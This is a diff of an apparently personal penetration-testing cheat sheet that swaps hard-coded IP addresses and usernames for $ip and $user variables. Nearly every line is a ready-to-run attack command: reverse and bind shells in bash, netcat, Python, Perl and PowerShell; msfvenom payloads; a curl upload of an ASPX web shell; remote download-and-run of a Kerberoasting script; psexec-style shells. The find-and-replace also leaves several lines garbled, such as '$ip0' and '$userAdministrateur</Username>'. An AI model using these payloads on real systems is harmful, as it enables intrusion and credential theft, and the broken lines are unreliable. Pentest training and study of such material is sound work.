@@ -462,7 +462,7 @@ https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-metho
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=80 -f aspx -o shell.aspx
 ````
 ````
-curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
+curl -T 'shell.aspx' 'http://$VictimIP/' -u $user:<password>
 ````
 ````
 http://$VictimIP/shell.aspx
@@ -4378,7 +4378,7 @@ Linux Shell NOTE!!!!!!
     --- If RCE is not working, try /bin/sh instead of /bin/bash
 
 - Bash:
-    > bind > /bin/bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
+    > bind > /bin/bash -i >& /dev/tcp/$ip/4443 0>&1
     > bind > /bin/bash -i >& /dev/tcp/192.168.49.91/80 0>&1
 - netcat without -e flag
     > bind > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.156 4445 >/tmp/f
@@ -4386,16 +4386,16 @@ Linux Shell NOTE!!!!!!
     > shell shock > rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.18%20443%20>/tmp/f
 - netcat linux (reverse shell)
     > listen > nc -nlvp 4443
-    > bind > nc 10.10.10.10 4443 -e /bin/sh
+    > bind > nc $ip 4443 -e /bin/sh
 - netcat linux (bind shell0
     > listen(victim) > nc -nlvp 4443 -e /bin/bash
-    > bind > nc 10.10.10.10 4443 -e /bin/sh
+    > bind > nc $ip 4443 -e /bin/sh
 - netcat windows (reverse shell)
     > listen > nc -nlvp 4443
-    > bind > nc.exe 10.10.10.10 4443 -e cmd.exe
+    > bind > nc.exe $ip 4443 -e cmd.exe
 - netcat windows (bind shell)
     > listen (victim) > nc.exe -nlvp 4444 -e cmd.exe
-    > bind > nc.exe -nv 10.10.10.10 4444
+    > bind > nc.exe -nv $ip 4444
 
 - socat Linux (reverse shell) NOTE! "-d -d" shows log output
     > listen (kali) > sudo socat -d -d TCP4-LISTEN:443 STDOUT
@@ -4404,7 +4404,7 @@ Linux Shell NOTE!!!!!!
 - python
     > bind > os.system('bash -c "bash -i >& /dev/tcp/10.10.14.28/4446 0>&1"')
     > bind > os.system('socat TCP:192.168.49.153:80 EXEC:bash')
-    > bind > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    > bind > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
     - If creating actual file (like reverse.py) add this to the file and download with wget: 
         import socket,subprocess,os
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -4417,12 +4417,12 @@ Linux Shell NOTE!!!!!!
     > ping > python -c 'import os;os.system("ping -c 2 192.168.49.153");'
     > eval being used on text box > os.system('bash -c "bash -i >& /dev/tcp/192.168.49.165/5555 0>&1"')#
 - perl
-    > bind > perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+    > bind > perl -e 'use Socket;$i="$ip";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 - powershell:
     > reverse > powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.18',4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
     > bind  > powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
     - For code injection
-        > echo |set /p="$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        > echo |set /p="$client = New-Object System.Net.Sockets.TCPClient("$ip",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 - Ruby
     > ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 - PHP (Try with all versions of PHP)
@@ -4584,25 +4584,25 @@ Linux Shell NOTE!!!!!!
     - Use the flag "-T4"
 
 ### nmap initial enumeration scans:
-    > tnas 10.10.10.10 1,2,4,5
+    > tnas $ip 1,2,4,5
     `- sudo nmap -p- -sV -vv -oN _nmap_tcp_quick 10.10.10.97
     `- sudo nmap -sC -sV -p- -vv -oN _nmap_tcp_full 10.10.10.97
-    `- sudo nmap -sU --top-ports 1000 -oN _nmap_udp_1000 10.10.10.100
+    `- sudo nmap -sU --top-ports 1000 -oN _nmap_udp_1000 $ip0
     `- sudo nmap -O --osscan-guess -oN _nmap_os 10.10.10.97
 
 ### nmap scans:
     - TCP Scan (quick):
-        > sudo nmap -sC -sV -vv -oA quick 10.10.10.10
+        > sudo nmap -sC -sV -vv -oA quick $ip
     - TCP Scan (full):
-        > sudo nmap -sC -sV -p- -vv -oA full 10.10.10.10
+        > sudo nmap -sC -sV -p- -vv -oA full $ip
     - UDP Scan (quick):
-        > sudo nmap -sU -sV -vv -oA quick_udp 10.10.10.10
+        > sudo nmap -sU -sV -vv -oA quick_udp $ip
     - UDP Scan (full):
-        > sudo nmap -sC -sV -p- -vv -oA full 10.10.10.10
-        > sudo nmap -sC -sV -O -oA initial 10.10.10.10
+        > sudo nmap -sC -sV -p- -vv -oA full $ip
+        > sudo nmap -sC -sV -O -oA initial $ip
     - Port Knock:
         > knock 10.10.10.24 1706
-        > for x in 7000 8000 9000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.10; done
+        > for x in 7000 8000 9000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x $ip; done
 
 ### nmap OS scan
     - OS Scan:
@@ -4670,7 +4670,7 @@ Linux Shell NOTE!!!!!!
         - dnsenum:
             > dnsenum megacorpone.com
         - fierce:
-            > fierce -dnsserver 10.10.10.100 -dns megacorpone.com
+            > fierce -dnsserver $ip0 -dns megacorpone.com
 
 ## LDAP
     - jxplorer
@@ -4684,7 +4684,7 @@ Linux Shell NOTE!!!!!!
             > ldapdomaindump 10.10.10.161 -u 'domain\username' -p 'password' -o /output/file/path --authtype SIMPLE
             > ldapdomaindump ldap://10.10.10.161
     - ldapsearch (null creds), if output "bind must be completed" or "operations error", you need creds. 
-        - ldapsearch -h 10.10.10.100 389 -x -s base -b '' "(objectClass=*)" "*" +
+        - ldapsearch -h $ip0 389 -x -s base -b '' "(objectClass=*)" "*" +
 
         - NOTE: "-D" is the username --> 'domain\username'
                 "-w" is hte passwrod --> 'password'
@@ -4737,7 +4737,7 @@ Linux Shell NOTE!!!!!!
             > iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") 
             > Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
         - GetUsersSPNs.py (pull hashes for specific users)
-            > GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs -save -outputfile GetUsersSPNs.out
+            > GetUserSPNs.py -request -dc-ip $ip0 active.htb/svc_tgs -save -outputfile GetUsersSPNs.out
             - check .out file for ticket
     - Crack hash
         - pull hash with GetNPUsers.py, any lines found put the whole hash into a file.
@@ -4876,7 +4876,7 @@ Linux Shell NOTE!!!!!!
             > nmap 10.10.10.37 --script=/usr/share/nmap/scripts/http-wordpress-brute.nse,http-wordpress-enum.nse,http-wordpress-users.nse
         - Username enumeration
             - Check the admin of the system by going to the site with "http://10.10.10.37/?author=1"
-            - You can also go to the login page to enter a username to see if "you entered for the username <username> is incorrect" indicating that is a valid user on the system
+            - You can also go to the login page to enter a username to see if "you entered for the username $user is incorrect" indicating that is a valid user on the system
         - Core version
         - wordpress plugin upload
             - wordpress plugin upload (MUST have admin login for the wp-admin portal for this to work)
@@ -4942,7 +4942,7 @@ Linux Shell NOTE!!!!!!
     - phpmyadmin
         - find version in page source
     - droopescan
-        > droopescan scan drupal -u http://10.10.10.10
+        > droopescan scan drupal -u http://$ip
     - shellshock / shell shock
         - Open up burp and intercept a login request on the page, check the header to make sure its being processed by .cgi
         - You could adjust the "User-Agent:" field with the repeater, example code:
@@ -4996,25 +4996,25 @@ Linux Shell NOTE!!!!!!
         > nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d 192.168.1.101
         > sudo nmap --script smb-vuln* -p 139,445 192.168.1.101
         > sudo nmap --script smb-enum-shares.nse -p445 10.10.10.123
-        > sudo nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10 
+        > sudo nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse $ip 
 
     - NetBIOS commands
-        > nmblookup -A 10.10.10.10
+        > nmblookup -A $ip
         > sudo nbtscan -r 10.11.1.0/24
     - SAMBA (SMB) comamnds
         - List samba shares
             > echo exit | smbclient -L \\\\192.168.1.101
             > nmap --script smb-enum-shares -p 139,445 192.168.1.101
         - smbmap
-            > smbmap -H 10.10.10.100
-            > smbmap -H 10.10.10.100 -u guest -p password
-            > smbmap -H 10.10.10.100 -P 445 -R --skip
+            > smbmap -H $ip0
+            > smbmap -H $ip0 -u guest -p password
+            > smbmap -H $ip0 -P 445 -R --skip
         - smbget
-            > smbget -R smb://10.10.10.100/sudo Replication
+            > smbget -R smb://$ip0/sudo Replication
     - smb version
         - go into ~/notes/exam/smbver.sh
         - edit smbver.sh to add the specific interface to send packats out of.
-        - sudo ./smbver.sh 10.10.10.10 
+        - sudo ./smbver.sh $ip 
         - Could also run a nmap script
             > sudo nmap -p 445 --script smb-protocols 192.168.1.38
     - enum4linux
@@ -5146,7 +5146,7 @@ Linux Shell NOTE!!!!!!
             > put tcp443meterp.asp tcp443meterp.txt
             > copy tcp443meterp.txt tcp443meterp.asp;.txt
     - WGET(80) client commas
-        > wget http://10.10.10.10/filetodownload.txt -O /tmp/filetodownload.txt
+        > wget http://$ip/filetodownload.txt -O /tmp/filetodownload.txt
         > chmod 777 /tmp/filetodownload.txt
         - download and output to specific place
             > wget -O google-wget.txt www.google.com
@@ -5172,7 +5172,7 @@ Linux Shell NOTE!!!!!!
         > fetch http://10.10.14.28:8088/grouping
     - curl(80) client commands
         - SImple get to server to see reply
-            >curl -v http://10.10.10.10/home.php
+            >curl -v http://$ip/home.php
         - GET
             - Get and write to a file
                 > curl https://example.com -k -o my.file
@@ -5218,8 +5218,8 @@ Linux Shell NOTE!!!!!!
             > wget -r ftp://anonymous:@192.168.153.127:30021
 
     - SCP(22) client commands
-        > transfer to > scp file.txt username@10.10.10.10:/tmp
-        > transfer from > scp username@10.10.10.10:/tmp/file .
+        > transfer to > scp file.txt username@$ip:/tmp
+        > transfer from > scp username@$ip:/tmp/file .
     - TFTP(69) client commands
         - Windows:
             > tftp -i 192.168.119.135 put bank-account.zip
@@ -5306,7 +5306,7 @@ Linux Shell NOTE!!!!!!
         - connect
             > nc -nv 192.168.103.39 143
         - Login
-            > A001 login <username> <password>
+            > A001 login $user <password>
 
     - IMAP secure (993)
         - connect
@@ -5340,22 +5340,22 @@ Linux Shell NOTE!!!!!!
                 > mount > sudo mount -t cifs //10.11.1.101/print$ /mnt
                 > mount > sudo mount -t cifs -o username=guest '\\10.11.1.101\wwwroot' /mnt/
                 or
-                > mount > sudo mount.cifs '//10.10.10.10/Shared' /mnt/ -o username=guest 
+                > mount > sudo mount.cifs '//$ip/Shared' /mnt/ -o username=guest 
                 > umount > sudo umount -f -l /mnt
                 > list mounts > cat /proc/mounts
             - Windows
                 > \\10.10.14.18\smb\file-to-download.exe
         - sambaclient
             > smbclient -U 'tyler%password' //10.10.10.97/newsite
-                ( this may work too) > echo exit | smbclient -N -L \\\\10.10.10.10
+                ( this may work too) > echo exit | smbclient -N -L \\\\$ip
             > put test.txt
             > get filetodownload.txt
         - psexec.py (requires a writable smb share, but will give shell. Requires user / password)
-            > psexec.py active.htb/svc_tgs@10.10.10.100
+            > psexec.py active.htb/svc_tgs@$ip0
         - smbexec.py (rpc and smb, but will give shell. Requires user / password)
-            > smbexec.py active.htb/svc_tgs@10.10.10.100
+            > smbexec.py active.htb/svc_tgs@$ip0
         - wmiexec.py
-            > wmiexec.py active.htb/svc_tgs@10.10.10.100 
+            > wmiexec.py active.htb/svc_tgs@$ip0 
         - magic script
             - links:
                 - https://www.oreilly.com/openbook/samba/book/ch08_02.html
@@ -5479,7 +5479,7 @@ Linux Shell NOTE!!!!!!
             - look up all groups
                 > enumdomgroups
             - look up users
-                > queryuser <username>
+                > queryuser $user
             - look up domain info
                 > querydominfo
             - lookup privledges
@@ -5654,9 +5654,9 @@ Linux Shell NOTE!!!!!!
                 > net user 
             - For another user
                 - Show groups a user is in
-                    > net user <username>
-                    > gpresult /USER <username> /V 
-                    > net user <username> /domain
+                    > net user $user
+                    > gpresult /USER $user /V 
+                    > net user $user /domain
         - Info about groups built on system
             - List all groups
                 > net localgroup
@@ -6111,7 +6111,7 @@ tar -zcvf enum.tar.gz ./enum
                 - cat /etc/passwd
                     - you can also column the output
                         > column /etc/passwd -t -s ":"
-                - groups <username>
+                - groups $user
         - IP info
             > ifconfig | more
             > ip a
@@ -6323,7 +6323,7 @@ tar -zcvf enum.tar.gz ./enum
 
     - sudo 
         - run as a specific user
-            > sudo -u <username> <program>
+            > sudo -u $user <program>
             > sudo -s
             > sudo -i
             > sudo /bin/bash
@@ -6334,7 +6334,7 @@ tar -zcvf enum.tar.gz ./enum
                     > sudo -l
                 - go to gtfobins website and look up command to escape 
                 - NOTE!!
-                    > must include "-u <username>" on the sudo commands
+                    > must include "-u $user" on the sudo commands
             - Escape rbash
                 > echo $PATH
                 > export -p
@@ -7739,13 +7739,13 @@ smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, 
 sudo swaks -t user1@test.com -t user2@test.com --from user3@test.com --server <mailserver
 LDAP Enumeration
 #for computers
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers
+python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --computers
 #for groups
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups
+python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --groups
 #for users
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
+python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --da
 #for privileged users
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-use
+python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --privileged-use
 NFS Enumeration
 nmap -sV --script=nfs-showmount <IP>
 showmount -e <IP>
@@ -7763,8 +7763,8 @@ enumpriv #like "whoami /priv"
 queryuser <user> #detailed user info
 getuserdompwinfo <RID> #password policy, get user-RID from previous command
 lookupnames <user> #SID of specified user
-createdomuser <username> #Creating a user
-deletedomuser <username>
+createdomuser $user #Creating a user
+deletedomuser $user
 enumdomains
 enumdomgroups
 querygroup <group-RID> #get rid from previous command
@@ -8527,7 +8527,7 @@ Example content
 <AutoLogon>
 <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
 <Enabled>true</Enabled>
-<Username>Administrateur</Username>
+$userAdministrateur</Username>
 </AutoLogon>
 <UserAccounts>
 <LocalAccounts>
@@ -8616,7 +8616,7 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 Powershell Transcript
-C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP
+C:\Users\$user\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP
 C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
 
 Password in Alternate Data Stream
@@ -8729,7 +8729,7 @@ ERROR_CONTROL
 : 1
 NORMAL
 BINARY_PATH_NAME
-: C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e c
+: C:\Users\mssql-svc\Desktop\nc.exe $ip 4444 -e c
 LOAD_ORDER_GROUP
 :
 TAG
@@ -9158,7 +9158,7 @@ runas /savecred /user:Administrator "cmd.exe /k whoami"
 
 Using runas with a provided set of credential.
 
-C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\
+C:\Windows\System32\runas.exe /env /noprofile /user:$user <password> "c:\users\
 
 $secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpassw
@@ -9592,7 +9592,7 @@ If you can't use Metasploit and only want a reverse shell.
 git clone https://tinyurl.com/2ccy84d8
 
 # generate a simple reverse shell to use
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f
+msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 EXITFUNC=thread -f
 python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 CVE-2019-1388
